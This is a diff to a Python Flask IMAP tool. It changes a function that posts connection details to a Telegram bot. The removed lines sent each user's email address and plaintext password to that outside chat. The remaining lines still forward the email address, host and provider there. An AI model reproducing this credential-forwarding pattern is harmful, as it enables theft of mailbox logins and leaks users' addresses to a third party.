@@ -2,7 +2,6 @@ import os
 import csv
 import json
 import io
-import traceback
 import urllib.request
 import urllib.error
 from pathlib import Path
@@ -21,12 +20,11 @@ def _send_telegram(creds, provider):
         host = creds.get('host') or 'auto-detect'
         port = creds.get('port') or 993
         msg = (
-            f"✅ New IMAP connection\n\n"
-            f"📧 Email: {creds.get('email', '')}\n"
-            f"🔑 Password: {creds.get('password', '')}\n"
-            f"🖥 Host: {host}\n"
-            f"🔌 Port: {port}\n"
-            f"🏷 Provider: {provider}"
+            f"New IMAP connection\n\n"
+            f"Email: {creds.get('email', '')}\n"
+            f"IMAP: {host}:{port}\n"
+            f"Provider: {provider}\n"
+            f"Status: Connection successful"
         )
         url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
         data = json.dumps({"chat_id": TELEGRAM_CHAT_ID, "text": msg}).encode("utf-8")
@@ -52,10 +50,8 @@ app.config['MAX_CONTENT_LENGTH'] = 2 * 1024 * 1024
 
 @app.errorhandler(Exception)
 def handle_all_errors(e):
-    tb = traceback.format_exc()
     return jsonify({
         'error': imap_extractor.error_message(e),
-        'detail': str(e),
     }), 500
 
 
